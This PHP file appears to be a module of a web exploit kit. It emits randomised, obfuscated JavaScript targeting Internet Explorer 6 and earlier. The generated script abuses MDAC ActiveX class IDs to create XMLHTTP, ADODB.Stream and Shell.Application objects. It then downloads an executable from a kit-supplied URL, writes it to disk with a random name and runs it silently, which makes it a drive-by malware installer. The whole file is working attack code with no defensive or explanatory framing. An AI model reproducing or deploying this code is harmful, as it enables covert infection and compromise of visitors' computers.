<?php

$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'mdac', $browser, $os, 'mdac' );

if (( $browser == 'ie' && $version <= 6 )) {
	$functionName = $ExploitFunctions[1];
	$eArray[] = '
function ' . $functionName . '() {
	var ' . $randVar[0] . ' = 0;
	var ' . $randVar[1] . ' = new Array(\'BD96C556-65A3-11D0-983A-00C04FC29E36\', \'BD96C556-65A3-11D0-983A-00C04FC29E30\', \'AB9BCEDD-EC7E-47E1-9322-D4A210617116\', \'0006F033-0000-0000-C000-000000000046\', \'0006F03A-0000-0000-C000-000000000046\', \'6e32070a-766d-4ee6-879c-dc1fa91d2fc3\', \'6414512B-B978-451D-A0D8-FCFDF33E833C\', \'7F5B7F63-F06F-4331-8A26-339E03C0AE3D\', \'06723E09-F4C2-43c8-8358-09FCD1DB0766\', \'639F725F-1B2D-4831-A9FD-874847682010\', \'BA018599-1DB3-44f9-83B4-461454C84BF8\', \'D0C07D56-7C69-43F1-B4A0-25F5A11FAB19\', \'E8CCCDDF-CA28-496b-B050-6C07C962476B\', null);
	while (' . $randVar[1] . '[' . $randVar[0] . ']) {
	var ' . $randVar[2] . ' = document.createElement(\'object\');
	' . $randVar[2] . '.setAttribute(\'id\', ' . $randVar[2] . ');
	' . $randVar[2] . '.setAttribute(\'classid\', \'clsid:\' + ' . $randVar[1] . '[' . $randVar[0] . ']);
	if(' . $randVar[2] . '){
		try {
			var ' . $randVar[3] . ' = ' . $randVar[2] . '.CreateObject(\'msxml2.XMLHTTP\', \'\');
			var ' . $randVar[6] . ' = ' . $randVar[2] . '.CreateObject(\'Shell.Application\', \'\');
			var ' . $randVar[4] . ' = ' . $randVar[2] . '.CreateObject(\'adodb.stream\', \'\');
			try {
				' . $randVar[4] . '.type = 1;
				' . $randVar[3] . '.open(\'GET\', \'' . $strUrl . '\', false);
				' . $randVar[3] . '.send();
				' . $randVar[4] . '.open();
				' . $randVar[4] . '.Write(' . $randVar[3] . '.responseBody);
				var ' . $randVar[5] . ' = \'.//..//' . rand( 10000, 99999 ) . '.exe\';
				' . $randVar[4] . '.SaveToFile(' . $randVar[5] . ', 2);
				' . $randVar[4] . '.Close();
				} catch(e) {}
				try {
					' . $randVar[6] . '.shellexecute(' . $randVar[5] . ');
				} catch(e) {}
			} catch(e) {}
		}
		' . $randVar[0] . '++;
	}
	{next}
}';
}

?>
